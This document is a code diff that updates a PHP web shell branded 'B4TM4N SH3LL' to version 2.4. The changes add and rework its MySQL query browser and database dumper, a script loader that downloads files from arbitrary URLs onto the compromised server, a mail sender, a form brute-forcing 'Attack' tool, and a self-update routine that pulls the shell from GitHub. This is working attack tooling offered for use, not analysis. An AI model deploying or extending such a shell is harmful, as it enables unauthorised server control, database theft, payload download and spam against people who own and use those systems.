@@ -17,8 +17,8 @@ $config=[
 	"user"    => "zaIgxSRawZ==",                             // B64E('user')
 	"pass"    => "42b378d7eb719b4ad9c908601bdf290d541c9c3a", // sha1(md5('pass'))
 	"title"   => "B4TM4N SH3LL",                             // Title
-	"version" => "2.3",                                      // Version
-	"debug"   => false                                       // Debug Mode
+	"version" => "2.4",                                      // Version
+	"debug"   => true                                        // Debug Mode
 ];
 
 session_start(); // Session Start
@@ -228,6 +228,8 @@ $start=microtime(true); 											// Time Pageload
 
 	#php-configuration{text-align:center}
 
+	.database-breadcrumb{margin:10px 0 0;display:inline-block;font-style: italic;}
+
 	#update{text-align:center}
 	#process-list{padding:25px;margin:25px auto 0px;border:1px solid #111;overflow:scroll;overflow-y:hidden}
 	#process-list s{text-decoration:none}
@@ -304,12 +306,14 @@ $start=microtime(true); 											// Time Pageload
 	.line{border-bottom:2px solid lime;text-align:center;width:287px;margin:auto}
 
 	.table {width:100%;margin:10px 0}
-	.table td,th{padding:5px;border:1px solid #111;word-break:break-all;max-width:250px;min-width:25px}
+	.table td,th{padding:5px;border:1px solid #111;max-width:250px;min-width:25px}
 	.table td.kanan{word-break:break-word}
 	.table td.kiri{width:30%}
 	.table tr:nth-child(odd){background:black}
 	.table tr:nth-child(even){background:#111}
 	.table tr:hover td{background:#333}
+
+	.database-table > td.table {word-break:normal;}
 	
 	.table tfoot td{padding:10px;text-align:center}
 	.map-switch{display:inline-block}
@@ -632,7 +636,8 @@ function PostUrlContent($url,$content)
 	$params=array(
 		'http' => array(
 			'method'  => "POST",
-			'header'  => "Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: $userAgent\r\n",
+			'header'  => "Content-Type: application/x-www-form-urlencoded\r\n".
+						 "User-Agent: $userAgent\r\n",
 			'content' => http_build_query($content)
 		)
 	);
@@ -781,15 +786,15 @@ function GetFileOwnerGroup($x)
 		{
 			$user=posix_getpwuid(fileowner($x));
 			$group=posix_getgrgid(filegroup($x));
-			return sprintf('%s(%s)/%s(%s)',$user['name'],$user['uid'],$group['name'],$group['gid']);
+			return sprintf('%s:%s/%s:%s',$user['name'],$user['uid'],$group['name'],$group['gid']);
 		}
 	}
-	return "?(?)/?(?)";
+	return "?:?/?:?";
 }
 
 function GetSafeMode() 
 {
-	if(ini_get("safe_mode")=='on') 
+	if(strtolower(ini_get("safe_mode"))=='on') 
 	{
 		$safemod="<font class='off'>ON</font>";
 	}
@@ -1675,13 +1680,14 @@ if(any("x",$_REQUEST))
 		'socket_shutdown','socket_strerror','socket_write','stream_select','stream_socket_server','symlink','syslog',
 		'system','virtual','xmlrpc_entity_decode'];
 
-		sort($security);
+		sort($security); 
 		$fucks=array_unique(array_merge($disable_functions,$security));
 		$table="";
 		$enable=0;
 		$disable=0;
 		$total=count($fucks);
-		foreach($fucks as $fuck) 
+
+		foreach($fucks as $fuck)
 		{
 			$table.="<tr><td></td><td>$fuck</td><td>";
 			if(in_array($fuck,$disable_functions))
@@ -1708,7 +1714,7 @@ if(any("x",$_REQUEST))
 		$risk=($enable / $total) * 100;
 		$secure=($disable / $total) * 100;
 
-		printf("<h2 style='text-align:center'>Sec. Info V1.1.%s</h2><br>
+		printf("<h2 style='text-align:center'>Sec. Info v1.2.%s</h2><br>
 			<h4 style='text-align:center;color:white'>Risks Rate <font color=red>[%s%%]</font> | Secure Rate <font color=lime>[%s%%]</font></h4><br><br>
 			<div class='auto-number'>
 				<table class='table sortable'>
@@ -1781,64 +1787,69 @@ if(any("x",$_REQUEST))
 	}
 	if($_REQUEST['x']=="db")
 	{
-		if(isset($_SESSION['connect'])&&$_SESSION['connect']=='true')
-		{
-			printf("<div class='database-session'>
-					<div class='database-query'>
-						<form action='?x=db&q=db' method='post'>
-							<label>MYSQL Query<hr></label><br>
-							<label><i style='color:#222'>
-								show databases;<br>
-								show tables from {database};<br>
-								show columns from {database}.{table};<br>
-								select * from {database}.{table};</i></label>
-							<textarea id='query' name='query'>%s</textarea><br>
-							<input type='submit' name='disconnect' value='Disconnect'/>
-							<input type='submit' value='Execute'/>
-						</form>
-					</div>",(isset($_SESSION['query'])?$_SESSION['query']:''),gethostbyname(http_host));
+		$connect=any("connect",$_SESSION)?$_SESSION['connect']:"";
+		$status=any("status",$_SESSION)?$_SESSION['status']:"";
+		$query=any("query",$_REQUEST)?$_REQUEST['query']:"show databases;";
 
+		if($connect=='true')
+		{
 			$process="";
 			$sql=mysql_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass']);
 			$result=mysql_list_processes($sql);
 			while($row=mysql_fetch_assoc($result))
 			{
 			    $process.=sprintf("<tr>
-			    	<td>%s</td>
-			    	<td>%s</td>
-			    	<td>%s</td>
-			    	<td>%s</td>
-			    	<td>%s</td></tr>",$row["Id"],$row["Host"],$row["db"],$row["Command"],$row["Time"]);
+			    	<td>%s</td><td>%s</td><td>%s</td>
+			    	<td>%s</td><td>%s</td></tr>",
+			    	$row["Id"],$row["Host"],$row["db"],
+			    	$row["Command"],$row["Time"]);
 			}
 			mysql_free_result($result);
-			
-			printf("<div class='database-process'>
-					<div id='mysql-process-result'>
-						<label>Database Process<hr></label>
-						<table class='table table-bordered'>
-							<thead>
-								<tr>
-									<th>Id</th>
-									<th>Host</th>
-									<th>Database</th>
-									<th>Command</th>
-									<th>Time</th>
-								</tr>
-							</thead>
-							<tbody>%s</tbody>
-						</table>
-					</div>
-			",$process);
 
-			printf("<div id='database-dump'>
-					<label>Database Dump<hr></label>
-					<form action='?x=db&xa=dmp' method='post'><br>
-						<label>Database</label><input type='text' name='database' value=''/><br>
-						<label>Output</label><input type='text' name='output' value='%s'/><br>
-						<input type='submit' value='Dump' />
-						<label>%s</label>
-					</form>
-				</div></div></div><div class='clr'></div>",$dir,@$_SESSION['status']);
+			printf("<div class='database-session'>
+						<div class='database-query'>
+							<form action='?x=db&xa=qry' method='post'>
+								<label>MYSQL Query<hr></label><br>
+								<label><i style='color:#222'>
+								show databases;<br>
+								show tables from {database};<br>
+								show columns from {database}.{table};<br>
+								select count(*) from {database}.{table};<br>
+								select * from {database}.{table} limit 0,10;</i></label>
+								<textarea id='query' name='query'>%s</textarea><br>
+								<input type='submit' name='disconnect' value='Disconnect'/>
+								<input type='submit' value='Execute'/>
+							</form>
+						</div>
+						<div class='database-process'>
+							<div class='mysql-process-result'>
+								<label>Database Process <a href='?x=db&xa=proc'>&#9851;</a><hr></label>
+								<table class='table table-bordered'>
+									<thead>
+										<tr>
+											<th>Id</th>
+											<th>Host</th>
+											<th>Database</th>
+											<th>Command</th>
+											<th>Time</th>
+										</tr>
+									</thead>
+									<tbody>%s</tbody>
+								</table>
+							</div>
+							<div class='database-dump'>
+								<label>Database Dump<hr></label>
+								<form action='?x=db&xa=dmp' method='post'><br>
+									<label>Database</label><input type='text' name='database' value=''/><br>
+									<label>Output</label><input type='text' name='output' value='%s'/><br>
+									<input type='submit' value='Dump' />
+									<label>%s</label>
+								</form>
+							</div>
+						</div>
+						<div class='clr'></div>
+					</div>
+					",$query,$process,$dir,$status);
 		}
 		else
 		{
@@ -1848,21 +1859,36 @@ if(any("x",$_REQUEST))
 						<label>Port</label><input type='text' name='port' value='3306'/><br>
 						<label>Username</label><input type='text' name='user' value='root'/><br>
 						<label>Password</label><input type='text' name='pass' value=''/><br>
-						<label>Database</label><input type='text' name='db' value=''/><br>
+						<label>Database</label><input type='text' name='dbas' value=''/><br>
 						<input type='submit' value='Connect'/>
 					</form>
 				</div>");
 		}
 
+		if(any("rs",$_REQUEST))
+		{
+			$_SESSION[$_REQUEST['rs']]='';
+		}
+
+		if(any("cd",$_REQUEST))
+		{
+			$_SESSION['qdb']=$_REQUEST['cd'];
+		}
+
+		if(any("ct",$_REQUEST))
+		{
+			$_SESSION['qtb']=$_REQUEST['ct'];
+		}
+
 		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="db")
 		{	
-			$cn=mysqli_connect($_REQUEST['host'],$_REQUEST['user'],$_REQUEST['pass'],$_REQUEST['db'],$_REQUEST['port']);
+			$cn=mysqli_connect($_REQUEST['host'],$_REQUEST['user'],$_REQUEST['pass'],$_REQUEST['dbas'],$_REQUEST['port']);
 
 			$_SESSION['host']=$_REQUEST['host'];
 			$_SESSION['port']=$_REQUEST['port'];
 			$_SESSION['user']=$_REQUEST['user'];
 			$_SESSION['pass']=$_REQUEST['pass'];
-			$_SESSION['db']=$_REQUEST['db'];
+			$_SESSION['dbas']=$_REQUEST['dbas'];
 
 			if($cn)
 			{
@@ -1871,64 +1897,111 @@ if(any("x",$_REQUEST))
 			}
 			else
 			{
-				printf("<b class='off'>Connection Failed</b>");
+
 				$_SESSION['connect']='false';
+				printf("<b class='off'>Connection Failed</b>");
 			}
 		}
 
-		if(any("q",$_REQUEST)&&$_REQUEST['q']=="db")
+		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="qry")
 		{
 			$_SESSION['status']='';
-			$sql=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],$_SESSION['db'],$_SESSION['port']);
+			$con=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],$_SESSION['dbas'],$_SESSION['port']);
 
 			if(isset($_REQUEST['disconnect']))
 			{
-				mysqli_close($sql);
+				mysqli_close($con);
 				unset($_SESSION['connect']);
 				unset($_SESSION['query']);
 				unset($_SESSION['host']);
 				unset($_SESSION['user']);
 				unset($_SESSION['pass']);
+				unset($_SESSION['dbas']);
+				unset($_SESSION['qdb']);
+				unset($_SESSION['qtb']);
 				header('location:'.php_self.'?x=db');
 			}
 
+			$sql=!empty($_REQUEST['query'])?$_REQUEST['query']:"show databases;";
+			$result=mysqli_query($con,$sql);
 			$data=[];
-			$query=!empty($_REQUEST['query'])?$_REQUEST['query']:'show databases;';
-			$result=mysqli_query($sql,$query);
-			$_SESSION['query']=$_REQUEST['query'];
-			
+			$name=[];
+
 			if($result)
 			{
+				while($fieldinfo=mysqli_fetch_field($result))
+				{
+					$name[]=$fieldinfo->name;
+				}
+				$data[]=$name;
 				while($row=mysqli_fetch_row($result))
 				{
 					$data[]=$row;
 				}
+				mysqli_free_result($result);
 			}
 			else
 			{
 				$data=false;
 			}
 
-			if ($data!==false)
+			if($data!==false)
 			{
-				print "<div class='auto-number'><table class='table'>";
+				$sqdb=@$_SESSION['qdb'];
+				$sqtb=@$_SESSION['qtb'];
+
+				$bsdb="<a href='?x=db&xa=qry&rs=qdb&query=show databases;'>Database</a>";
+				$bqdb=!empty($_SESSION['qdb'])?"&#8594;	<a href='?x=db&xa=qry&rs=qtb&query=show tables from $sqdb;'>$sqdb</a>":"";
+				$bqtb=!empty($_SESSION['qtb'])?"&#8594;	<a href='?x=db&xa=qry&query=show columns from $sqdb.$sqtb;'>$sqtb</a>":"";
+
+				printf("<div class='database=table'>
+						<div class='database-breadcrumb'>%s %s %s</div>
+						<div class='auto-number'>
+						<table class='table sortable'>",$bsdb,$bqdb,$bqtb);
+
 				foreach($data as $key => $val)
 				{
 					if(is_array($val))
 					{
-						print "<tr>";
-						foreach($val as $key2 => $val2)
+						if($key==0)
 						{
-							if(!is_array($val2))
+							print "<tr><th class='sorttable_nosort'>&#9776;</th>";
+							foreach($val as $key2 => $val2)
 							{
-								print "<td width='15'></td><td>".$val2."</td>";
+								if(!is_array($val2))
+								{
+									print "<th>".$val2."</th>";
+								}
 							}
+							print "</tr>";
 						}
-						print "</tr>";
+						else
+						{
+							print "<tr><td width='15'></td>";
+							foreach($val as $key3 => $val3)
+							{
+								if(!is_array($val3))
+								{
+									if(strpos($val2,'Database')!==false)
+									{
+										print "<td><a href='?x=db&xa=qry&cd=$val3&query=show tables from $val3;'>$val3</a></td>";
+									}
+									elseif(strpos($val2,'Tables')!==false)
+									{
+										$val4=substr($val2,strpos($val2,'Tables_in_')+10);
+										print "<td><a href='?x=db&xa=qry&cd=$val4&ct=$val3&query=select * from $val4.$val3 limit 0,10;'>$val3</a></td>";
+									}
+									else
+									{
+										print "<td>$val3</td>";
+									}
+								}
+							}
+							print "</tr>";
+						}
 					}
-					
 				}
-				print "</table></div>";
+				print "</table></div></div>";
 			}
 			else
 			{
@@ -1940,7 +2013,6 @@ if(any("x",$_REQUEST))
 		{
 	    	$database=$_REQUEST['database'];
 	    	$output=$_REQUEST['output'];
-
 			if (!file_exists($output)&&!empty($database)) 
 			{
 			    $link=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);
@@ -2001,11 +2073,16 @@ if(any("x",$_REQUEST))
 			    $handle=fopen($output,'w+');
 			    fwrite($handle,$return);
 			    fclose($handle);
-				$_SESSION['status']=sprintf("Dump with success... <a href='?a=v&r=%s'>'%s'</a>",urle($output),basename($output));	    
+				$_SESSION['status']=sprintf("Dump with success... <a href='?a=v&r=%s' target='_blank'>'%s'</a>",urle($output),basename($output));	    
 			}
-
+			else
+			{
+				$_SESSION['status']="<span class=off>Dump Error</span>";
+			}
+			
 			header('location:'.php_self.'?x=db');
 		}
+
 	}
 	if($_REQUEST['x']=="terminal")
 	{
@@ -2357,15 +2434,14 @@ if(any("x",$_REQUEST))
 									'&message='+document.getElementById('email-message').value+
 									'&attachment='+document.getElementById('email-attachment').value);
 
-							\"/>
-							<span id='send-result'></span>	
+							\"/>	
 						</form>
 					</fieldset>
 				</div>
 				<div class='divide-right'>
 					<fieldset>
-						<legend>Spam</legend>
-						Coming Soon
+						<legend>Result's</legend>
+						<div id='send-result'></div>
 					</fieldset>
 				</div>
 			</div>
@@ -2828,11 +2904,11 @@ if(any("x",$_REQUEST))
 	if($_REQUEST['x']=="update")
 	{
 		$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';
-		$current_version=2.3; //Sensitive Case Variable
+		$current_version=2.4; //Sensitive Case Variable
 
 		if($config['debug']==true)
 		{
-			$git_script=htmlentities(file_get_contents(__FILE__));
+			$php_script=htmlentities(file_get_contents(__FILE__));
 			$latest_version=$current_version+0.1; //Test Update latest version -/+ 0.1
 		}
 		else
@@ -2856,7 +2932,7 @@ if(any("x",$_REQUEST))
 		}
 		else
 		{
-			$status.='Latest Version '.$config['version'];
+			$status.='Latest Version '.$latest_version;
 		}
 
 		Printf("<div id='update'>
@@ -3004,22 +3080,60 @@ if(any("z",$_REQUEST))
 				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
 			  </div>";
 
+		$path=dirname(__FILE__)._.'script-loader';
+		if(!is_dir($path)) mkdir($path,0755);
+
+		$recur=new RecursiveIteratorIterator(
+		    new RecursiveDirectoryIterator($path),
+		    RecursiveIteratorIterator::LEAVES_ONLY 
+		);
+
+		$result="";
+		foreach ($recur as $key => $val) 
+		{
+			if(basename($key)!=".."&&basename($key)!=".")
+			{
+				$result.=sprintf("<tr>
+						<td></td>
+						<td><a href='%s' target='_blank'>%s</a></td>
+						<td><center>%s</center></td>
+						</tr>",
+						GetUrlFromPath(realpath($key)),
+						basename(realpath($key)),
+						GetFileTime(realpath($key),'modify')
+				);
+			}
+		}
+
 		printf("<div id='script-loader'>
-			<form onsubmit='return false;' class='new'>
-				<label>Url</label><input type='text' id='url-source' value=''/><br>
-				<label>Filename</label><input type='text' id='file-name' value=''/><br>
-				<input type='submit' onclick=\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('url-source').value+'&filename='+document.getElementById('file-name').value);\"/><br>
-			</form>
-		</div>
-		<div id='download-result' class='result'></div>");
+					<div class='divide'>
+						<div class='divide-left'>
+							<form onsubmit='return false;' class='new'>
+								<label>Url</label><input type='text' id='url-source' value=''/><br>
+								<label>Filename</label><input type='text' id='file-name' value=''/><br>
+								<input type='submit' onclick=\"return getAjax(true,'download-result','POST','?z=script-loader&url='+document.getElementById('url-source').value+'&filename='+document.getElementById('file-name').value);\"/><br>
+								<div id='download-result' class='result'></div>
+							</form>
+						</div>
+						<div class='divide-right'>
+							<fieldset>
+								<legend>List's</legend>
+								<div class='auto-number'>
+									<table class='table'>
+									<thead><tr><th>No.</th><th>Name</th><th>Modified</th>
+									<tbody>%s</tbody>
+									</table>
+								</div>
+							</fieldset>
+						</div>
+					</div>
+				</div>",$result);
 
 		if(any("url",$_REQUEST)&&any("filename",$_REQUEST))
 		{
 			ob_clean();
 			$url=$_REQUEST['url'];
 			$filename=$_REQUEST['filename'];
-			$path=dirname(__FILE__)._.'script-loader';
-			if(!is_dir($path)) mkdir($path,0755);
 			$dest=rtrim($path,_)._.$filename;
 			if(GetUrlExists($url)&&!empty($filename))
 			{
@@ -3276,15 +3390,13 @@ if(any("z",$_REQUEST))
 		 	'"message":"HA HA HA HA HA HA HA HA",',
 		 	'}'];
 
-		printf("<div class='form-bruteforces'>
+		printf("<div class='divide'>
 				<div class='divide-left'>
 					<form onsubmit='return false;' class='new'>
 						<label>Url Action</label><input type='text' id='form-url' placeholder='http://'/><br>
 						<label>Count's</label><input type='number' id='form-count' value='100' min='10' autocomplete='off'/><br>
-						<fieldset>
-							<legend>Parameter (JSON)</legend>
-							<textarea id='form-parameter'>%s</textarea>
-						</fieldset>
+						<label>Parameter (JSON)</label>
+						<textarea id='form-parameter'>%s</textarea>
 						<input type='submit' onclick=\"return ajaxAbort(true,'form-result')\" value=Cancel />
 						<input type='submit' value='Attack' onclick=\"return getAjax(true,'form-result','POST','?z=form-bruteforces&url='+document.getElementById('form-url').value+'&parameter='+document.getElementById('form-parameter').value+'&count='+document.getElementById('form-count').value);\"/><br>
 					</form>
